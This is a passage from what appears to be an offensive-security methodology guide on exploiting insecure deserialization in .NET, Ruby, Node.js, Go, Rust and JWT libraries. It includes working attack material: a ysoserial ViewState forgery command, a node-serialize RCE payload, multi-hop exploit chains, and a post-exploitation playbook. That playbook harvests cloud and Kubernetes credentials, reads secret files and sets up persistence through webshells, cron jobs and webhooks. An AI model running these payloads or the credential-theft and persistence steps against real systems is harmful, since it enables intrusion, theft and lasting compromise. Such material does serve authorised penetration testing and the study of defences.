Same shape for `DataContractJsonSerializer` / `DataContractSerializer` with a known-type list an attacker can influence — the `KnownTypes` attribute or the constructor's `knownTypes` parameter drives which classes are constructible. `NetDataContractSerializer` accepts the type from the wire and is always unsafe.

**YamlDotNet** — the .NET analog to SnakeYAML. Default `Deserializer` accepts `!<type>` tags naming any CLR type; safe usage requires `WithNodeDeserializer` / a restricted type-resolver. Grep for `new Deserializer()` or `DeserializerBuilder` without a `WithTypeConverter` restriction.

**ViewState** — the highest-yield .NET deserialization on classic ASP.NET. `__VIEWSTATE` is a `LosFormatter` / `ObjectStateFormatter` blob protected by a MAC keyed on the machine key. If the machine key is **disabled** (`enableViewStateMac=false`, legacy), **leaked** (web.config disclosure, `.git`, hardcoded/default key), or crackable, forge a gadget ViewState:
```bash
# needs the leaked validationKey / decryptionKey + algorithms from web.config
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc" \
  --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey=<hex> \
  --validationalg="SHA1" --validationkey=<hex>
```
Then POST it as `__VIEWSTATE`. Harvest machine keys from `web.config`, `machine.config`, DVCS dumps, and known-default-key lists. `__VIEWSTATEGENERATOR` and the target `path`/`apppath` must match for the MAC to validate.

### Ruby

`Marshal.load` on user input is RCE — the language docs explicitly forbid it: "By design, Marshal.load can deserialize almost any class loaded into the Ruby process. In many cases this can lead to remote code execution if the Marshal data is loaded from an untrusted source. Marshal.load is not suitable as a general purpose serialization format and you should never unmarshal user supplied input or other untrusted data." No `allowed_classes` equivalent exists; the finding is absolute.

Gadget chains land in Rails/Devise version-dependent form via cookie stores, ActiveSupport `MessageEncryptor`, and cache adapters. **`secret_key_base` leakage** — env-var disclosure, `.git` in the deployment, an accidentally-committed `credentials.yml.enc` with a co-located `master.key`, or a `config/master.key` served as a static file — collapses signed-cookie protection: forge a signed session with a Marshal payload → deserialization on the next request. Grep the deployment for `master.key`, `credentials.yml.enc` in the public tree, and `SECRET_KEY_BASE` in any commit history.

`YAML.load` (pre-Psych-4) accepts arbitrary tags including class instantiation; `YAML.unsafe_load` (Psych 4+) preserves the pre-4 behavior. `YAML.safe_load`'s default `permitted_classes` is `[TrueClass, FalseClass, NilClass, Integer, Float, String, Array, Hash]`; anything outside must be explicitly added. Fingerprint the Ruby version (Psych 4 shipped with Ruby 3.1) and the exact call — the finding shape and severity change across the boundary.

**Rails-specific sink surface** — the message-verifier / message-encryptor / cookie-store code paths all unmarshal Marshal blobs on the way out, and Rails' own remote-code-execution CVE history (the 4.x / 5.x cluster) tracked these exact paths. On modern Rails the risk is not a native framework CVE but the combination of a leaked `secret_key_base` plus any code path that still uses `Marshal` as its serializer (some apps switch to `JSON` for cookies but leave `Marshal` for cache adapters).

### Node.js

**`node-serialize`** — the classic Node RCE library. The `unserialize()` function evaluates a `_$$ND_FUNC$$_` marker as an IIFE:
```javascript
require('node-serialize').unserialize('{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}')
```
Any input containing `_$$ND_FUNC$$_` and trailing `()` executes on unserialize. Detection: grep the source for `_$$ND_FUNC$$_` in captured payloads, and for `require('node-serialize')` in the app.

**`serialize-javascript`** — Yahoo's SSR-safe serializer that escapes HTML and JS line terminators by default; safe when embedded in a `<script>` block *without* `unsafe: true`. But: **CVE-2024/2026 cluster** in serialize-javascript itself lands independently — a February 2026 RCE via `RegExp.flags` and `Date.prototype.toISOString()` prototype-method poisoning, plus a March 2026 DoS and a September 2026 XSS via unescaped `</script>` in function bodies. The library is not neutral even when used "safely"; the mitigation is version-pinning to the post-February-2026 patch. Load `insecure_deserialization_novel_deep.md § serialize-javascript — Prototype-Method Poisoning Cluster` for the exact CVE/GHSA numbers, fixed versions, and the payload construction.

**Prototype-pollution-to-deserialization bridges** — a merge that reaches `Object.prototype` (via `lodash.merge` / `_.set` / `Object.assign` with a `__proto__` key) can override methods a downstream unmarshal path relies on. Class shape: a JSON parser or template engine calls a polluted method, which now returns attacker-controlled data that reaches an `eval`/`Function` sink. Route the DOM-side of this to `prototype_pollution.md`; the deserialization angle lives here.

**Long-tail Node deserialization libraries** — worth grepping the `package.json` and lockfile for:
- **`funcster`** — designed to serialize/deserialize functions across process boundaries; `deserialize()` on untrusted input is RCE.
- **`serialize-to-js`** — same shape as `node-serialize`; older, less maintained, still on many production stacks.
- **`js-yaml`** — the `.load()` function (pre-4.0) accepts arbitrary `!<type>` tags including class instantiation. `.safeLoad()` (removed in 4.0 — `.load()` in 4.0+ is safe-only) blocks the class-instantiation surface. Fingerprint the major version.
- **`yaml` (Eemeli Aro)** — a different library; its `parse()` is safe-by-default but `parseDocument()` with a custom schema can accept type-instantiation tags.
- **Node `vm` and `vm2`** — not deserialization per se, but frequently chained: a template engine or JSON parser produces a string that reaches `vm.runInNewContext(untrusted)`. `vm2` has an ongoing sandbox-escape history; treat it as unsafe on any 2024–2026 fingerprint.

**Server-side JSON with mongoose / `bson` / `EJSON`** — MongoDB's Extended JSON accepts `$type` and `$binary` and older drivers had wrapping code that instantiated JS classes from `$code`/`$scope` pairs. On a modern driver the risk is narrower but still worth checking; grep for `EJSON.parse` and `BSON.deserialize` on user-controlled bytes.

**Node `vm` and `vm2` sandbox-escape crossover** — `vm.runInNewContext(untrusted)` is the canonical "compile+eval attacker code" sink; the `vm2` library sold itself as a hardened sandbox but has an unbroken 2019–2024 history of escapes (the `2024` cluster is why `vm2` was deprecated in favor of `isolated-vm`). Any deserialization sink whose downstream flow reaches `vm.runInNewContext(x)` or `vm2.run(x)` collapses to RCE on Node. Grep patterns: `require('vm')`, `require('vm2')`, `require('isolated-vm')`, and the constructor invocations `new VM(`, `new NodeVM(`, `new Isolate(`. `isolated-vm` is the currently-recommended sandbox but is still not a security boundary for untrusted code according to its own README — the guidance is "assume any code running inside a VM has full access to the host."

**Worker-thread and cluster pickling** — Node.js worker threads pass structured-clone-serialized data between threads; a malicious `SharedArrayBuffer` or a crafted `Transferable` can carry attacker data across the trust boundary. The class shape is niche but real for services that fan out attacker JSON to worker pools.

### Go & Rust

**Go `encoding/gob`** — stdlib itself declares it out-of-scope for the security policy: "This package is not designed to be hardened against adversarial inputs, and is outside the scope of https://go.dev/security/policy. The Decoder does only basic sanity checking on decoded input sizes, and its limits are not configurable. Care should be taken when decoding gob data from untrusted sources, which may consume significant resources." Any `gob.NewDecoder(net.Conn).Decode(&iface)` where the destination is an interface is an unauthenticated deserialization sink. Encoded types can be arbitrary reachable types on the peer's type graph, and the DoS class (memory exhaustion via crafted length prefixes) is trivially reachable. The RCE-equivalent primitive requires that the decoded interface's methods reach a dangerous sink downstream; on Go this is rare compared to Java/PHP because the language lacks pervasive reflection into arbitrary types, but a `gob`-decoded value that reaches `template.ParseFiles`, `os/exec`, or `plugin.Open` completes the chain.

Grep patterns for Go targets:
- `gob.NewDecoder` / `.Decode(&anyInterface)` — the top-level surface.
- `encoding/gob` in the imports plus HTTP handlers that read raw request bodies — the transport-plus-decoder combination.
- `protobuf.Unmarshal` on a `google.protobuf.Any` field where the type-URL is attacker-controlled — the reflection-based dispatch case.

**Rust `serde`** is a codec layer; deserialization risk lives in the format crate. Concrete grep patterns:
- `serde_pickle::from_slice` / `serde_pickle::value_from_reader` — accepts Python-pickle streams with the full pickle-native RCE surface. Any Rust service that deserializes pickle-format bytes has to be treated as if it were a Python service on that path.
- `ciborium::from_reader` — supports user-registered tag handlers for CBOR (major-type 6, tag numbers 0..2^64-1). A tag callback is the CBOR analog of pickle's `__reduce__`; a service that registers a "run-code" tag handler is a direct RCE sink.
- `bincode::deserialize` — the crate is unmaintained per docs.rs and lacks size-limit enforcement by default. DoS-class findings live here.
- `#[serde(untagged)]` enums — can be steered to unintended variants when discriminant fields overlap; the class shape is "attacker sends a JSON that both variants of an untagged enum accept, and the wrong variant lands."
- `serde_yaml` — YAML deserialization; the crate itself was deprecated in 2024 but is still widely used. Any `!!` tag handling on untrusted input is the Rust echo of the Python `yaml.load` class.

**Both** are quiet-primitive classes — the finding requires demonstrating that the specific decode path is reachable with attacker-controlled bytes and that the deserialized type carries some exploitable behavior on construction; a raw `Decode(&aStruct)` on a POD struct is not a finding without a downstream sink. The class-abstraction bar: in a memory-safe language, the deserialization-to-RCE bridge usually goes through a *format-callback* mechanism (tag handlers, `__reduce__`-like hooks) rather than through classical gadget-chain reflection.

### JWT / JWS / JWE deserialization angle

JWT is included here because algorithm-confusion, nested-JWT (`cty: JWT`), and JWKS-fetch behaviors let an attacker deliver arbitrary structured data through the auth path and, on modern JWT libraries, into recursive-verification or property-lookup logic that has its own vulnerability surface. Primitive: token forgery, forced parser recursion, or SSRF-via-JWKS.

**Algorithm confusion** — historical `alg: none` (RFC 7518 §3.1 lists it as Optional) and the HS256-signed-with-RSA-public-key (the verifier expects RS256 but is called generically; the library treats the public key as an HMAC secret) primitives. Mostly mitigated by 2019–2022 upstream fixes, but the class recurred in September 2026: a Critical PyJWT advisory (asymmetric-PEM detection bypass under mixed-algorithm allowlists → HS256 token forgery) plus a High (DER-form public keys accepted as HMAC secrets, bypassing prior CVE-2022-29217 protections). Load `insecure_deserialization_novel_deep.md § PyJWT September 2026 Cluster — Alg-Confusion Recurrence` for the six-advisory family, affected version ranges, and mitigations.

**Nested JWT (`cty: JWT`)** — RFC 7519 defines nested JWTs where the payload of an outer JWS/JWE is itself a JWT, signaled by `cty=JWT`. Libraries that recursively verify hit a `RecursionError` on deeply nested input — a DoS class currently live in PyJWT (a September 2026 advisory covers this specifically). Attackers can also chain algorithm confusion across nesting levels: outer HS256, inner RS256 with the outer key as the "secret" — the library uses the wrong verification path per layer.

**JWKS-follow-redirect** — a September 2026 PyJWT `PyJWKClient` advisory establishes that the client follows HTTP redirects when fetching JWKS. A user-controlled or attacker-influenced JWKS URL becomes SSRF; combined with a cloud metadata endpoint (route via `ssrf.md`) or a signed-URL prediction (route via `cloud/aws.md`), reachability escalates.

**Options-dictionary mutation** — a September 2026 PyJWT advisory establishes that a mutation to the `options` dict silently bypasses claim verification. The class: mutable option dictionaries shared across verify calls are a general JWT-library defect shape.

**Detection hooks for the JWT class**:
- Fingerprint the JWT library and version — the Authorization header response error (if it leaks the library name), the app's dependency lockfile, or an intentionally malformed token that produces a library-specific error string.
- Test `alg: none` — every library should reject; if any accepts, the finding is immediate.
- Test HS256-with-RSA-public-key by extracting the public key from a `/.well-known/jwks.json` endpoint (or the app's key-info endpoint) and signing an attacker-crafted claims payload with it as an HMAC secret.
- Test `alg` case-swap (`RS256` vs `rs256`) and `alg` field-position changes; some libraries de-serialize the header lazily and pick up different alg values from different parse paths.
- If the app exposes a JWKS URL (`kid` header referring to a key ID), test whether the URL can be attacker-controlled. A `jku` (JWK Set URL) header is the classic; some libraries accept it despite it being a well-known injection surface.
- Test `cty: JWT` with deeply-nested inner tokens for RecursionError DoS.

Route the general JWT verify path to `authentication_jwt.md`; this file owns the deserialization-adjacent behaviors (recursion, JWKS-fetch SSRF, options-dict mutation) that turn a JWT library into a deserialization sink or an SSRF pivot.

## Sleeping Giants — Supply-Chain Reframing

The single most important frame shift in this class since 2024 is that Java gadget-chain reachability is a *fluctuating* property of a dependency's version history. Kreyssig, Houy, Riom, and Bartel (CCS'25) enumerate three modification patterns an attacker (or a downstream typo-squatter with commit access) can apply to a benign dependency to *activate* a dormant chain without adding a visible vulnerability:

- **Transitive Serializability** — making a supertype `Serializable` extends the surface to every subclass, which may already carry a magic-method chain that was previously inert because a parent was not deserializable. The commit shape is a one-line `implements Serializable` addition on a base class, or `extends Object` → `extends SerializableBase`.
- **Final Properties** — dropping `final` on a class or field enables reflection-driven property write during deserialization, restoring an attacker's ability to steer a constructor/setter path that was fixed at compile time. The commit shape is removing the `final` keyword.
- **Interface Method Reachability** — adding an interface method (e.g., `hashCode` / `equals` / `toString` on a class that did not previously override them) unlocks trampoline gadgets — a method whose invocation on unmarshal reaches a further sink. The commit shape is a new override method that delegates to an inner field.

The empirical result: applying these three patterns to 533 sampled Maven dependencies activated chains in 139 (26.08%), with 53 verified as containing dormant chains that a minor upstream change could introduce. **Consequences for a hunter**: a one-shot audit that returns "no chain" only holds for the version audited; the correct posture is continuous re-audit on every dependency bump. **Consequences for a defender**: reachability-driven prioritization (Tabby, AndroChain, or the newer FLASH detector — USENIX'25, evaluated on 30 apps with 30.8% lower FN and 25.9% lower FP than baselines) reruns per release, not per year.

**Audit-cadence framing.** The 2019-era guidance was "audit gadget chains once per major dependency version and monitor for CVEs." That guidance is now insufficient: any minor-version bump can activate a dormant chain, and the CVE process does not track the activating change (which is not itself a security fix). The correct cadence is:
1. On every dependency bump (including patch versions), re-run reachability detection.
2. Treat the three modification patterns as diff-reviewable — a PR that adds `implements Serializable` or drops `final` deserves a "did this activate a chain?" audit.
3. Assume the frontier detector today (FLASH, USENIX'25) will improve; the reachability status of your app is only as current as the last tool run.

Load `insecure_deserialization_novel_deep.md § Sleeping Giants` for the per-pattern mechanism, FLASH's confirmed detection advance, the audit-cadence implication, and the interaction with the ICSE'25 trampoline-gadget results.

## Modern Mitigation Architecture

The correct architectural mitigations are known and version-boundary-specific; treat these as *preconditions to exploitation* on target audit.

- **Java (JDK 9+)** — **JEP 290** delivered `ObjectInputFilter` with `Status {UNDECIDED, ALLOWED, REJECTED}` and `FilterInfo` fields (`serialClass`, `arrayLength`, `depth`, `references`, `streamBytes`). Configured via the `jdk.serialFilter` system property (overrides the security property of the same name in `conf/security/java.security`). **JDK 17+ JEP 415** adds context-specific filter *factories* via `jdk.serialFilterFactory` or `ObjectInputFilter.Config.setSerialFilterFactory(BinaryOperator<ObjectInputFilter>)` — one factory hardens every `ObjectInputStream` in the process. Absence of a filter = unbounded deserialization; presence + wildcard-allow is a false-safety pattern to flag as a finding shape.
- **.NET (≥ 9)** — in-box `BinaryFormatter` throws unconditionally starting .NET 9 Preview 6; Microsoft explicitly classifies it as "an insecure format" that "cannot be made secure." The out-of-band `System.Runtime.Serialization.Formatters` NuGet package restores legacy behavior and is officially unsupported. On .NET Framework it remains present.
- **Python (PyYAML ≥ 6.0)** — bare `yaml.load(x)` raises `TypeError`; the caller must pass `Loader=`. `yaml.safe_load` blocks class-instantiation tags. Any `yaml.load` sink with no Loader on 6.0+ is broken code, not exploitable; on 5.x it defaults to `FullLoader`; on < 5.1 it defaults to the unsafe loader.
- **Python (PyTorch ≥ 2.6)** — `torch.load()` defaults to `weights_only=True`, restricting deserialization to tensor data. **Not a complete mitigation** — two 2025–2026 CVEs land RCE on the `weights_only=True` path.
- **PHP** — `unserialize($blob, ['allowed_classes' => [...]])` (PHP 7.0+) is a mitigation, not a guarantee; upstream itself says don't use it on untrusted input. PHAR auto-unserialize on plain file operations was removed in PHP 8.0 (RFC `phar_stop_autoloading_metadata`, 25/0 vote).
- **Ruby** — `Psych 4` / `Ruby 3.1` made `YAML.load` an alias for `safe_load`; unsafe requires `YAML.unsafe_load`. No such flip on `Marshal.load`.

**Detecting whether a mitigation is actually enforced** — the config is not the enforcement. Check:

- **JEP 290/415 on Java** — the JVM startup command should have `-Djdk.serialFilter=<pattern>` or `-Djdk.serialFilterFactory=<class>`. `jps -v` on a shell shows JVM args; a running JVM's arguments can also be read from `/proc/<pid>/cmdline`. Absence of both properties + no `ObjectInputFilter.Config.setSerialFilter(...)` call in the app's bootstrap code = no filter enforced. A filter that lists only known-bad classes without a `!*` catchall reject is a bypass surface.
- **`TypeNameHandling` on Json.NET** — grep the source and the runtime config for `TypeNameHandling.Objects|Arrays|Auto|All` and for `JsonSerializerSettings` construction. Absence is not proof of `None` — the default in older Newtonsoft.Json versions is `None`, but a `TypeNameHandling.Auto` set in a global default via `JsonConvert.DefaultSettings` collapses every serializer in the process.
- **`weights_only=True` on PyTorch** — grep every `torch.load(` call site; any without `weights_only=True` on ≥ 2.6 is a regression to unsafe. Note two 2025–2026 CVEs land on the "safe" path anyway.
- **`SafeConstructor` on SnakeYAML** — grep for `new Yaml()` (safe on 2.x, unsafe on 1.x) and `new Yaml(new Constructor(...))` (unsafe on both) and `new Yaml(new SafeConstructor())` (safe). The 2.0 boundary is load-bearing.
- **`allowed_classes` on PHP `unserialize`** — grep for the second argument on `unserialize(`; a raw `unserialize($blob)` with no options is the classical shape.

**Sleeping Giants means the mitigation audit has a shelf life** — a JEP 290 filter that allows CommonsCollections in the allow-list is fine today and dangerous tomorrow if a dependency bump activates a dormant chain. Re-audit on every release.

## Format-Parser Differentials

Cross-format smuggling is an emerging bypass surface — a payload that parses safely under one library and dangerously under another, or a checked layer that a downstream layer re-parses differently. Base coverage:

- **JSON vs BSON** — BSON `code_w_scope` (major type `\x0F`) carries a serialized JavaScript function plus a `document` scope. Legacy MongoDB drivers instantiate and can invoke the code when the wrapping accessor is called; a JSON-first check does not see the BSON structure.
- **YAML vs JSON** — a `%YAML 1.1` document containing `!!python/object/apply:os.system ['id']` parses as a mapping under a JSON-first check but as an executable class instantiation under YAML. Middleware that content-sniffs YAML from a `.yml` extension after a JSON schema-validate passes.
- **MessagePack strict vs loose** — the ext-type mechanism (types `-128..127`) is user-extensible; a `fixext_1` with type `0x63` has been used as a hidden pickle-in-msgpack channel by libraries that register a "pickle" ext-type handler on the receiver.
- **CBOR** — user-registered tag handlers (major type 6, RFC 8949) execute callbacks on decode. Tag numbers `0..2^64-1` are attacker-choosable, so a tag-handler registration for a handler that calls `pickle.loads`/`eval` on the tagged content is the CBOR analog of pickle's `__reduce__`. `ciborium` in Rust and `cbor2` in Python both support the tag-hook API.
- **ASN.1/DER** — parser confusion between OpenSSL / mbedTLS / .NET / Python `pyasn1` on optional/default fields lands in TLS handshakes, certificate chains, and PKCS#12 / PKCS#7 blobs. A signed structure that one parser interprets as an integer and another as a wrapped OCTET STRING opens a signature-verification bypass surface.
- **Protobuf reflection** — a decoder that trusts a `type_url` field (`google.protobuf.Any` shape) to select a message type is picking a class name from attacker data. If the type registry maps to a class with a downstream sink, the pattern echoes Jackson polymorphic typing in a protobuf wrapper.
- **URL-encoded serialized data through a WAF** — some WAFs decode `%XX` sequences once, some twice; a payload double-encoded past the WAF single-decode can reach a sink that decodes twice. This is a WAF-differential rather than a parser-differential per se but lands the same way.

Load `insecure_deserialization_advanced_deep.md § Format-Parser Differentials` for the cross-language parser-differential matrix (with confirmed vs asserted findings), the WAF-differential class, and the check-time-vs-use-time bypass shape.

## Advanced Techniques

**Signed-blob bypass**

- HMAC/signing uses a weak or leaked secret: forge the payload and sign it. Machine keys in `web.config`, `secret_key_base` in `.env` disclosure, `SECRET_KEY` in a `.git` snapshot are the top three sources. `SECRET_KEY_BASE=abc123` in a Dockerfile committed to a public repo is the fourth.
- Algorithm confusion — the signature is verified with an algorithm the attacker names in the token header (`alg: HS256` when the verifier expected `RS256`, so the library uses the RSA public key as an HMAC secret).
- Strip the signature and test the unsigned code path — some libraries default to "verify if present, accept if absent." Load `authentication_jwt.md` for the general JWT verify path; this file owns only the deserialization surface behind the token.
- Length-extension on custom MAC schemes that hash `secret || data` rather than using HMAC.
- Signature bypass via parser differential — the signer canonicalizes with parser A, the verifier canonicalizes with parser B; a payload that both parsers accept but that A signs and B semantically differs on breaks the binding.
- Key confusion — the app has multiple keys (staging, prod, rotation-old, rotation-new) and the verifier accepts any of them; an attacker who compromises the least-protected key (staging in a public repo) forges against prod.

**Second-order deserialization** — store the serialized blob in a profile field, filename, or import, then trigger on admin export, cache warm, background worker, or batch job. The write path and the deserialize path are different endpoints, so scan both. Delivery shapes include:
- **Filename** — an uploaded file whose name is later shown in an admin file browser that renders it through a template that unmarshals a cached blob keyed by name.
- **Profile field** — display name, bio, address; unmarshaled by a report generator or an admin dashboard that iterates all users.
- **Log line** — a header value (`User-Agent`, `Referer`, `X-Forwarded-For`) logged as a serialized structured event and later reconstructed by a log-viewer that unmarshals.
- **Cache write** — a request that reaches `redis-cli SET` on a key the app deserializes on next read; frequently a cache-poisoning primitive (`cache_poisoning.md`) chains into this.

**Compression wrappers** — gzip / base64 / URL-encoding layers that a naive WAF cannot inspect. Un-wrap magic-byte detection to see through them. Common combinations: `base64(gzip(java-serialized))`, `base64(url-encoded(php-serialized))`, `hex(compressed(pickle))`. Each layer is a WAF-bypass opportunity if the WAF only decodes one layer.

**Cross-format smuggling** — a JSON body accepted by one middleware, re-parsed as YAML by a downstream, delivered to a Java Jackson polymorphic-typing sink — three parsers, three chances for a bypass. The class shape is more general than deserialization but its highest-yield instances land here.

**Post-deserialization gadget chaining** — once a chain reaches an SQL-injection sink (a `PreparedStatement` inside a gadget), a JNDI-lookup sink (as documented), or a file-write sink (writing a webshell via a `FileOutputStream`), the deserialization primitive escalates into a different class. The chain is the "how"; the resulting capability is the "what."

Load `insecure_deserialization_advanced_deep.md § Second-Order and Blob-Bypass Exploitation` for the second-order attack-graph model, the signed-blob key-leakage class inventory, and the compression-layered WAF-bypass measured matrix.

## Chaining

**Upstream (what capability grants a deserialization primitive)**
- File-upload with predictable write path + a downstream path-taking function → PHAR trigger. Route the upload half via `file_upload.md` and the path-injection half via `path_traversal_lfi_rfi.md`.
- Session/cookie forgery via leaked signing key → forged serialized blob accepted by the app. Route the key leakage via `information_disclosure.md` and the crypto half via `authentication_jwt.md`.
- SSRF into an internal RMI/JMX/T3/JMS endpoint that trusts intra-network traffic → direct deserialization sink. Route the SSRF via `ssrf.md`.
- Prototype pollution reaching an unmarshal path via a polluted method → Node.js deserialization primitive. Route the pollution via `prototype_pollution.md`.

**Downstream (what the deserialization primitive grants)**
- RCE on the app server → follow `rce.md` for the post-exec expansion (in-container recon, secret extraction, lateral movement).
- JNDI outbound → cloud-metadata reachability (route via `ssrf.md` for the metadata-endpoint enumeration; `cloud/aws.md`, `cloud/gcp.md`, `cloud/azure.md` for the credential-extraction step per provider).
- Auth bypass via forged session/role object → route to `broken_function_level_authorization.md` for the escalated-endpoint enumeration.
- Privilege escalation via manipulated field on a trusted type → route to `idor.md` or `broken_function_level_authorization.md`.

**Composite chains (concrete multi-hop paths, each hop routed)**

- **Machine-key leakage → ViewState RCE → in-container secret extraction → cloud pivot** — `information_disclosure.md § web.config / DVCS Disclosure` produces the machine key; this file's ViewState section produces RCE; `rce.md § Container Escape and Secret Extraction` produces cloud creds; `cloud/aws.md § IMDSv2 Credential Extraction` produces the AWS role. Capability transferred at each arrow: (config disclosure → signing key), (signing key → forged ViewState blob), (RCE → shell access), (shell → IMDS reachability), (IMDS reachability → session token).
- **SSRF → intra-network RMI/JMX → ysoserial URLDNS oracle → ysoserial CommonsCollections chain → RCE** — `ssrf.md § IPv4/IPv6/DNS Rebinding` produces the internal reachability; this file's URLDNS oracle confirms the sink; the chain-selection paragraph produces the payload; `rce.md` owns the post-exec. The chain's load-bearing property is that internal-only RMI/JMX endpoints frequently lack the JEP 290 filters the HTTP layer has.
- **Prototype pollution → polluted `Object.prototype.constructor` → template engine reaches attacker constructor → SSTI-shape execution** — `prototype_pollution.md` produces the pollution; this file's Node.js section frames the bridge; `ssti.md` owns the template-engine execution. The capability transferred at each hop: (pollution → global-method override), (global-method override → unmarshal callback control), (callback control → template evaluation of attacker code).
- **Uploaded phar renamed `.jpg` → path-traversal into `getimagesize(<user path>)` on PHP 7.x → PHAR metadata unserialize → phpggc Laravel chain → RCE** — `file_upload.md` produces the write; `path_traversal_lfi_rfi.md` produces the sink reachability; this file's PHAR section produces the deserialization; `rce.md` owns the post-exec. PHP version fingerprint is the gate — the chain dies on 8.0+ without an explicit `getMetadata()` call.
- **`.git` disclosure → `secret_key_base` → forged signed Rails session with Marshal payload → Marshal.load on next request → RCE** — `information_disclosure.md § DVCS Enumeration` produces the key; `authentication_jwt.md` (or the framework-specific `frameworks/ruby_on_rails.md`) frames the cookie-signing shape; this file's Ruby section owns the Marshal sink; `rce.md` owns the post-exec.
- **Attacker-uploaded HuggingFace model → inference service loads via `torch.load(user_path)` → pickle deserialization → RCE on the inference worker** — the file-upload half is a public-hub or webhook pattern (`file_upload.md`); this file's Python section owns the `torch.load` sink; `rce.md` owns the post-exec. This is the ML-supply-chain shape and is rapidly becoming the dominant deserialization surface on AI-adjacent stacks.
- **JWT with `cty: JWT` + malicious JWKS URL under attacker control → PyJWT `PyJWKClient` follows redirect → SSRF into cloud metadata → JWKS fetched from IMDS-adjacent endpoint returns attacker key material → forged JWT accepted** — this file's JWT section frames the client-side deserialization surface; `ssrf.md` owns the redirect reachability; `cloud/aws.md § IMDSv2 Credential Extraction` owns the metadata reach; `authentication_jwt.md` owns the token-forgery half.

Route by filename in every hop; the capability transferred at each arrow is the load-bearing detail.

**Confirmation chain — capabilities the callback oracle establishes before the exec chain**. The DNS/HTTP oracle probe establishes three separate capabilities that the exec chain reuses: (a) parser liveness (the deserializer ran and reached the graph invariant that fires the callback), (b) egress reachability (the target can reach the attacker's OAST host, so a subsequent exec chain's DNS/HTTP-shape exfil is viable), (c) attribution (the callback's source IP matches the target's known egress range, ruling out unrelated network traffic). Each of these three is a chainable prerequisite; the exec chain that follows treats them as satisfied and skips repeat verification. When any of the three fails on the safe probe, the exec chain is expected to fail the same way — for example, if egress is blocked, an exec chain that exfils via DNS will silently fail and the finding downgrades from Confirmed to Reachable. Pair `network_egress.md` for the outbound-policy audit when the safe probe lands but exec-chain exfil doesn't.

**Chain from base to advanced sibling** — the base's chaining catalog names the capabilities transferred; `insecure_deserialization_advanced_deep.md § Chain-Primitive Composition — Advanced Cases` extends each with compound compositions where the deserialization primitive is reused across SQL / SSRF / template / XXE / path-traversal / LDAP / JVM-internals sinks in a single graph. Read the advanced sibling's compound cases when the target's classpath supports more than one downstream sink from a single reachable chain.

## Post-Exploitation

Once a deserialization primitive lands, the immediate expansion path depends on the runtime, but a repeatable playbook applies across languages:

**In-container recon (first 60 seconds)**
- `id`, `whoami`, `hostname`, `uname -a` — process identity and container/VM shape.
- `cat /proc/self/environ | tr '\0' '\n'` — environment variables including `AWS_*`, `KUBERNETES_*`, `DATABASE_URL`, `SECRET_KEY_BASE`, service credentials.
- `ls -la /var/run/secrets/kubernetes.io/serviceaccount/` — Kubernetes service-account token.
- `curl -s http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"` — AWS IMDSv2 reachability (route to `cloud/aws.md § IMDSv2 Credential Extraction` for the credential-fetch details).
- `curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/` — GCP metadata (route to `cloud/gcp.md`).
- `curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01` — Azure metadata (route to `cloud/azure.md`).

**Credential harvest**
- `find / -name '.env' 2>/dev/null`, `find / -name 'credentials' 2>/dev/null`, `find / -name '*.key' 2>/dev/null`.
- `cat ~/.aws/credentials`, `cat ~/.docker/config.json`, `cat ~/.kube/config`.
- `printenv | grep -iE 'key|secret|token|password'`.
- Process memory: `gcore <pid>` and grep the core for `AKIA[0-9A-Z]{16}`, `sk-`, `gh[pousr]_`, bearer-token shapes.

**Persistence primitives**
- Webshell in the webroot (path derived from the RCE payload's cwd or the framework's expected static-file location).
- systemd user unit in `~/.config/systemd/user/` for user-scope persistence without root.
- `cron`/`at` job — check `/etc/cron*`, `crontab -l`, `/var/spool/cron/`.
- Kubernetes: an admission webhook or a mutating webhook that persists across pod restarts (route to `cloud/kubernetes.md`).
- Container image poisoning if the app writes to its own base image (rare but real).

**Lateral movement**
- `netstat -tnp` or `ss -tnp` — connected services (Redis, PostgreSQL, internal APIs).
- Reused credentials — the DB password is often reused for the cache; the app's Kubernetes SA token has RBAC for adjacent namespaces.
- Internal service discovery — DNS SRV records, `/etc/hosts`, Kubernetes DNS, Consul.

Route the general post-exec expansion to `rce.md`; this file's contribution is the initial primitive and the deserialization-specific persistence shapes (writing a serialized-object trojan into a shared cache so every restart auto-executes on session-load is a class shape that `rce.md`'s general "webshell" section does not cover).

## Testing Methodology

1. **Find sinks** — locate decode/unmarshal calls on user-influenced data. Sink-first grep for polymorphic-type handles (`enableDefaultTyping`, `TypeNameHandling.Objects|All|Auto`, `@type`, `$type`, `!!python/`, `_$$ND_FUNC$$_`, `Phar::getMetadata`, `Marshal.load`).
2. **Confirm format** — magic bytes after unwrapping base64/gzip; framework fingerprint; error-stack class names.
3. **Fingerprint versions** — the classpath / runtime version decides which chain fires. JAR names, `X-Powered-By`, `Server` header, `__VIEWSTATEGENERATOR`, error-stack module names. On Java, get JAR names from stack traces, `WEB-INF/lib` if listable, or `MANIFEST.MF` disclosure paths.
4. **Safe oracle first** — DNS/HTTP OAST callback before command-exec. `ysoserial URLDNS` (Java), `PSObject` DNS-probe (.NET), a benign `__wakeup` beacon (PHP), a `subprocess.Popen(['nslookup', <oast>])` gadget (Python). Walk the confirmation-without-RCE ladder in order.
5. **Chain selection** — match the fingerprinted classpath/runtime to a known chain; do not spray. If the classpath does not match any known chain, that is a Sleeping Giants candidate — dependency-bump history may have activated one, so re-check the current version's `MANIFEST.MF`.
6. **Minimal PoC** — least-destructive command demonstrating code execution or logic bypass. `id` / `whoami` / a callback with the hostname; never a real payload on a production system.
7. **Session/cookie focus early** — server-side session stores (Java, PHP, .NET ViewState, Rails cookie) are the fastest wins.
8. **Second-order sweep** — profile fields, filenames, import blobs; trigger via admin actions or scheduled jobs. The sink's write endpoint and the sink's read endpoint are different URLs and often owned by different teams.
9. **Document the callback proof** — record the exact OAST hit's timestamp, source IP, and request headers. On a shared corporate outbound gateway, "the callback came from the target" is the load-bearing evidence; without the source-IP match, an attacker could be exfiltrating from anywhere.
10. **Retest on adjacent instances** — if the target has staging / dev instances, the same payload should fail there if they are patched — a same-payload success on dev + failure on prod is a false positive from infrastructure noise; success on both confirms the class.

